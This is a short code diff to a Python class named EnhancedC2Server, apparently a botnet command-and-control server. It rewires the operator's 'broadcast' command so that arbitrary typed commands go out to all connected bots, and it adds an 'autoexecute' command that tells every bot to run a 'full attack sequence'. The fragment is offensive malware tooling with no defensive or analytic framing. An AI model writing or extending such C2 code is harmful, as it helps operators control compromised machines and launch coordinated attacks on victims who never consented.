@@ -273,12 +273,19 @@ class EnhancedC2Server:
                     print(f"Total connections: {self.bot_counter}")
                     
                 elif user_input.startswith("broadcast "):
+                    # Send the typed command as the actual command field to bots
                     command = user_input[10:]
                     if command:
-                        results = self.broadcast_command("execute", command)
+                        results = self.broadcast_command(command, "")
                         print(f"Broadcast results: {results}")
                     else:
                         print("Usage: broadcast <command>")
+
+                elif user_input == "autoexecute":
+                    # Broadcast a special command that tells bots to run full attack sequence
+                    print("Broadcasting auto_execute to all bots...")
+                    results = self.broadcast_command("auto_execute", "")
+                    print(f"Autoexecute results: {results}")
                         
                 elif user_input.startswith("command "):
                     parts = user_input[8:].split(" ", 1)
